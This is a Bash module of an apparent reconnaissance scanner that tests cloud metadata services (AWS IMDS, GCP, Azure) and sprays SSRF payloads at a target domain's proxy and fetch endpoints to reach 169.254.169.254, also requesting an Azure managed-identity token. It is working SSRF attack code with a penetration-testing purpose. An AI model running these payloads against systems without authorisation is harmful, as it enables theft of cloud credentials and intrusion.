#!/usr/bin/env bash
# metadata_phase.sh - Cloud metadata-service exposure checks (169.254.169.254),
# SSRF to metadata, IMDSv1/v2.

metadata_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "metadata_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/metadata"

    local results=0
    local vulns_file="$output_dir/metadata/metadata_vulns.txt"
    local access_file="$output_dir/metadata/metadata_access.txt"
    local findings_file="$output_dir/metadata/findings.json"

    log "INFO" "Starting metadata phase for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # --- Direct metadata service access (from host) ---
    local metadata_endpoints=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data"
        "http://169.254.169.254/latest/meta-data/ami-id"
        "http://169.254.169.254/latest/meta-data/hostname"
        "http://169.254.169.254/latest/meta-data/instance-id"
        "http://169.254.169.254/latest/meta-data/instance-type"
        "http://169.254.169.254/latest/meta-data/local-ipv4"
        "http://169.254.169.254/latest/meta-data/public-ipv4"
        "http://169.254.169.254/latest/meta-data/security-groups"
        "http://169.254.169.254/latest/meta-data/iam/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://169.254.169.254/latest/meta-data/iam/info"
        "http://169.254.169.254/latest/meta-data/network/"
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"
        "http://169.254.169.254/latest/user-data"
        "http://169.254.169.254/latest/dynamic/instance-identity/document"
        "http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"
        "http://169.254.169.254/latest/dynamic/instance-identity/signature"
        "http://169.254.169.254/latest/dynamic/fws/instance-id"
    )

    for meta_url in "${metadata_endpoints[@]}"; do
        local meta_status meta_body
        meta_body=$(curl -s -m 5 -w "\n%{http_code}" "$meta_url" 2>/dev/null || true)
        meta_status=$(echo "$meta_body" | tail -1)

        if [[ "$meta_status" == "200" ]]; then
            local content
            content=$(echo "$meta_body" | head -n -1)
            log "INFO" "Metadata accessible: $meta_url"

            echo "[METADATA-ACCESS] $meta_url - Accessible (HTTP 200)" >> "$access_file"
            ((results++)) || true

            write_finding "{\"type\":\"metadata_exposed\",\"url\":\"$meta_url\",\"severity\":\"CRITICAL\",\"evidence\":\"Cloud metadata endpoint accessible: $(echo "$content" | head -c 100)\"}" \
                "$findings_file" 2>/dev/null || true

            # Detect IMDSv1 (no token required)
            if [[ "$meta_url" == *"latest/meta-data"* ]]; then
                echo "[IMDSV1-ACCESS] $meta_url - IMDSv1 accessible (no token required)" >> "$vulns_file"
                ((results++)) || true

                write_finding "{\"type\":\"imdsv1_accessible\",\"url\":\"$meta_url\",\"severity\":\"CRITICAL\",\"evidence\":\"IMDSv1 accessible - no token required, vulnerable to SSRF\"}" \
                    "$findings_file" 2>/dev/null || true
            fi
        fi
    done

    # --- Test IMDSv2 token ---
    local imdsv2_token_url="http://169.254.169.254/latest/api/token"
    local token_resp token_status
    token_resp=$(curl -s -m 5 -w "\n%{http_code}" -X PUT \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
        "$imdsv2_token_url" 2>/dev/null || true)
    token_status=$(echo "$token_resp" | tail -1)

    if [[ "$token_status" == "200" ]]; then
        local token
        token=$(echo "$token_resp" | head -n -1)

        echo "[IMDSV2-TOKEN] IMDSv2 token obtained: ${token:0:20}..." >> "$access_file"
        ((results++)) || true

        # Use token to access metadata
        local imdsv2_meta_resp
        imdsv2_meta_resp=$(curl -s -m 5 \
            -H "X-aws-ec2-metadata-token: $token" \
            "http://169.254.169.254/latest/meta-data/" 2>/dev/null || true)

        if [[ -n "$imdsv2_meta_resp" ]]; then
            echo "[IMDSV2-ACCESS] IMDSv2 metadata accessible with token" >> "$access_file"
            ((results++)) || true
        fi
    elif [[ "$token_status" == "403" || "$token_status" == "401" ]]; then
        echo "[IMDSV2-ONLY] IMDSv2 required - token request rejected (HTTP $token_status)" >> "$access_file"
    fi

    # --- SSRF to metadata via application ---
    local ssrf_params=(
        "?url=http://169.254.169.254/latest/meta-data/"
        "?url=http://169.254.169.254/latest/user-data"
        "?callback=http://169.254.169.254/latest/meta-data/"
        "?redirect=http://169.254.169.254/latest/meta-data/"
        "?webhook=http://169.254.169.254/latest/meta-data/"
        "?fetch=http://169.254.169.254/latest/meta-data/"
        "?target=http://169.254.169.254/latest/meta-data/"
        "?endpoint=http://169.254.169.254/latest/meta-data/"
        "?ping=http://169.254.169.254/latest/meta-data/"
        "?load=http://169.254.169.254/latest/meta-data/"
        "?import=http://169.254.169.254/latest/meta-data/"
        "?src=http://169.254.169.254/latest/meta-data/"
        "?uri=http://169.254.169.254/latest/meta-data/"
        "?image=http://169.254.169.254/latest/meta-data/"
        "?path=http://169.254.169.254/latest/meta-data/"
    )

    local test_paths=(
        "/api/proxy"
        "/api/fetch"
        "/api/url"
        "/api/load"
        "/api/import"
        "/api/webhook"
        "/api/preview"
        "/api/image"
        "/proxy"
        "/fetch"
        "/redirect"
        "/url"
    )

    for tpath in "${test_paths[@]}"; do
        for param in "${ssrf_params[@]}"; do
            local ssrf_url="https://${domain}${tpath}${param}"
            local ssrf_status ssrf_body
            ssrf_body=$(curl -s -m 15 -w "\n%{http_code}" "$ssrf_url" 2>/dev/null || true)
            ssrf_status=$(echo "$ssrf_body" | tail -1)

            if [[ "$ssrf_status" == "200" ]]; then
                local ssrf_content
                ssrf_content=$(echo "$ssrf_body" | head -n -1)

                echo "$ssrf_content" | grep -qiE '(ami-id|instance-id|instance-type|local-ipv4|security-groups|iam)' 2>/dev/null && {
                    echo "[SSRF-METADATA] $ssrf_url - SSRF to metadata successful" >> "$vulns_file"
                    ((results++)) || true

                    write_finding "{\"type\":\"ssrf_to_metadata\",\"url\":\"$ssrf_url\",\"severity\":\"CRITICAL\",\"evidence\":\"SSRF allows reading cloud metadata\"}" \
                        "$findings_file" 2>/dev/null || true
                } || true

                echo "$ssrf_content" | grep -qiE '(password|secret|token|key|credential)' 2>/dev/null && {
                    echo "[SSRF-METADATA-SECRETS] $ssrf_url - SSRF leaks metadata secrets" >> "$vulns_file"
                    ((results++)) || true

                    write_finding "{\"type\":\"ssrf_metadata_secrets\",\"url\":\"$ssrf_url\",\"severity\":\"CRITICAL\",\"evidence\":\"SSRF leaks sensitive metadata including credentials\"}" \
                        "$findings_file" 2>/dev/null || true
                } || true
            fi
        done
    done

    # --- Test GCP metadata ---
    local gcp_metadata_urls=(
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://169.254.169.254/computeMetadata/v1/"
        "http://metadata.google.internal/computeMetadata/v1/project/project-id"
        "http://metadata.google.internal/computeMetadata/v1/instance/name"
        "http://metadata.google.internal/computeMetadata/v1/instance/zone"
    )

    for gmeta_url in "${gcp_metadata_urls[@]}"; do
        local gm_status gm_body
        gm_body=$(curl -s -m 5 -w "\n%{http_code}" \
            -H "Metadata-Flavor: Google" \
            "$gmeta_url" 2>/dev/null || true)
        gm_status=$(echo "$gm_body" | tail -1)

        if [[ "$gm_status" == "200" ]]; then
            echo "[GCP-METADATA] $gmeta_url - GCP metadata accessible" >> "$vulns_file"
            ((results++)) || true

            write_finding "{\"type\":\"gcp_metadata_exposed\",\"url\":\"$gmeta_url\",\"severity\":\"CRITICAL\",\"evidence\":\"GCP metadata endpoint accessible\"}" \
                "$findings_file" 2>/dev/null || true
        fi
    done

    # --- Test Azure metadata ---
    local azure_metadata_urls=(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    )

    for ameta_url in "${azure_metadata_urls[@]}"; do
        local am_status am_body
        am_body=$(curl -s -m 5 -w "\n%{http_code}" \
            -H "Metadata: true" \
            "$ameta_url" 2>/dev/null || true)
        am_status=$(echo "$am_body" | tail -1)

        if [[ "$am_status" == "200" ]]; then
            echo "[AZURE-METADATA] $ameta_url - Azure metadata accessible" >> "$vulns_file"
            ((results++)) || true

            write_finding "{\"type\":\"azure_metadata_exposed\",\"url\":\"$ameta_url\",\"severity\":\"CRITICAL\",\"evidence\":\"Azure metadata endpoint accessible\"}" \
                "$findings_file" 2>/dev/null || true

            # Check for managed identity token
            local am_content
            am_content=$(echo "$am_body" | head -n -1)
            echo "$am_content" | grep -qiE '(access_token|token_type)' 2>/dev/null && {
                echo "[AZURE-MI-TOKEN] $ameta_url - Azure managed identity token exposed" >> "$vulns_file"
                ((results++)) || true

                write_finding "{\"type\":\"azure_mi_token_exposed\",\"url\":\"$ameta_url\",\"severity\":\"CRITICAL\",\"evidence\":\"Azure managed identity token accessible\"}" \
                    "$findings_file" 2>/dev/null || true
            } || true
        fi
    done

    # Write count
    echo "$results" > "$output_dir/metadata/count.txt"

    py_log "INFO" "metadata_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Metadata phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    metadata_phase "$@"
fi
